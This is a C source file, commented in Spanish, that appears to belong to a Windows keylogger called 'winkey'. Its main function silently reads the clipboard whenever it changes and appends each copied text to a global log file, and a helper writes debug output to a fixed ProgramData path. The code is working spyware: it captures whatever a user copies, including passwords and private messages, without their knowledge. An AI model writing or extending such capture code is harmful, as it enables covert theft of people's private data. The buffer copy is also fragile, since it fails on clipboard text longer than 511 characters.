#include "winkey.h"
// funcion para debuggear y ver en un archivo
#include <stdarg.h> 

void DebugLog(const char* format, ...)
{
    FILE* debugFile;
    // Usamos una ruta fija en ProgramData para asegurar los permisos
    errno_t err = fopen_s(&debugFile, "C:\\ProgramData\\debug_winkey.log", "a");
    if (err == 0 && debugFile != NULL) {
        // Añadir un timestamp
        time_t now = time(NULL);
        struct tm t;
        localtime_s(&t, &now);
        fprintf(debugFile, "[%02d:%02d:%02d] ", t.tm_hour, t.tm_min, t.tm_sec);

        // Escribir el mensaje formateado
        va_list args;
        va_start(args, format);
        vfprintf(debugFile, format, args);
        va_end(args);

        fprintf(debugFile, "\n");
        fclose(debugFile);
    }
}

/**
    Leer el texto actual del portapapeles de Windows.
    Compararlo con lo que tenemos guardado en lastClipboardText.
    Si son diferentes: ¡Significa que el usuario ha copiado algo nuevo! Lo guardamos en el log y actualizamos lastClipboardText con este nuevo texto.
    Si son iguales: No hacemos nada
    Usar malloc para guardar mas espacio?
 */

// variable estatica para recordar el ultimo texto guardado
static char lastClipboardText[512] = {0};

// funcion para registrar el contenido del portapapeles
void LogClipboardIfChanged(void)
{
    // Comprobamos si el archivo de log esta abierto
    if (!g_winkeyState.logFile) {
        DebugLog("El archivo de log principal no está abierto. Saliendo.");
        return ;
    }

        // Intentamos abrir el portapapeles, si no, lo intentamos despues
        // Pasamos NULL porque nuestro programa no tiene una ventana principal (HWND)
        if (!OpenClipboard(NULL)) {
            return;
        }
        // Vemos que hay dentro del porpapeles
        HANDLE hData = GetClipboardData(CF_TEXT);
        if (hData == NULL) {
            // Si devuelve NULL, significa que el porpapeles no tiene texto
            CloseClipboard();
            return;
        }
        // Bloqueamos el handle para obtener un puntero de memoria real
        // convertido a char* para poder leerlo como texto
        char* clipboardText = (char*)GlobalLock(hData);
        if (clipboardText == NULL) {
            CloseClipboard();
            return;
        }
        // Comparamos el texto actual con el ultimo que guardamos.
        if (strcmp(clipboardText, lastClipboardText) != 0 && strlen(clipboardText) > 0) {
            // Escribimos cabecera portapapeles
            fprintf(g_winkeyState.logFile, "\n\n####### Init clipboard #######\n%s\n####### finish clipboard #######\n", clipboardText);
            fflush(g_winkeyState.logFile);
            // actualizamos nuestra memoria interna con el nuevo texto
            strcpy_s(lastClipboardText, sizeof(lastClipboardText), clipboardText);
        }
        // Desbloqueamos la memoria
        GlobalUnlock(hData);
        //Cerramos portapapeles
        CloseClipboard();
}
